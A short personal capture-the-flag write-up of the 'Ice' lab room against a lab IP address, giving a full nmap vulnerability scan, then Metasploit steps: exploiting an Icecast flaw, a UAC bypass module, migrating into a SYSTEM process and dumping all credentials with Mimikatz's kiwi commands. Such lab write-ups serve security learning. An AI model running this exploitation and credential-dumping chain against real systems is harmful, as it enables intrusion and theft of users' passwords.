# Ice Room

> Osama Albawab | 28/4/2020

-----------------------------------

# ------ 10.10.187.3 --------

# nmap scan
> `root@OZMA:~/Downloads# nmap -sS -sV -sC -A -p- --script vuln 10.10.187.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 02:42 +03
Nmap scan report for 10.10.187.3
Host is up (0.068s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  ssl/ms-wbt-server?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-vuln-ms12-020:
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown:
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
8000/tcp  open  http               Icecast streaming media server
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
49152/tcp open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49159/tcp open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49160/tcp open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49161/tcp open  msrpc              Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/28%OT=135%CT=1%CU=37697%PV=Y%DS=2%DC=T%G=Y%TM=5EA770
OS:58%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS
OS:=7)OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M
OS:508NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   64.93 ms 10.9.0.1
2   75.57 ms 10.10.187.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 601.89 seconds

  `

# VULNERABLE to CVE-2004-1561
> exploited by metasploit
> search icecast
> sysinfo to see the system info
> Metasploit Local Exploit Suggester, or Lester for short. Lester is a post module that you can use to check a system for local vulnerabilities, [[ run post/multi/recon/local_exploit_suggester ]]
> `run post/multi/recon/local_exploit_suggester

[*] 10.10.187.3 - Collecting local exploits for x86/windows...
[*] 10.10.187.3 - 30 exploit checks are being tried...
[+] 10.10.187.3 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.187.3 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.187.3 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.187.3 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.187.3 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.187.3 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.187.3 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.187.3 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
`
> we ran exploit/windows/local/bypassuac_eventvwr
> [[ getprivs ]] to check for privileges
> now we gained more privileges to migrate to processes and stuff
> using ps we saw NT AUTHORITY processes so that we can migrate to them
> 1268  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM
> C:\Windows\System32\spoolsv.exe
> migrate -N spoolsv.exe
> meterpreter > getuid
> Server username: NT AUTHORITY\SYSTEM
> after becoming NT AUTHORITY\SYSTEM we can now see every user's password
> so we used a program to dump all the passwords and the program is Mimikatz
> [[ load kiwi ]] => [[ creds_all ]] to see all the creditionals



===================================================================
# Was fun learned alot !!!!
===================================================================
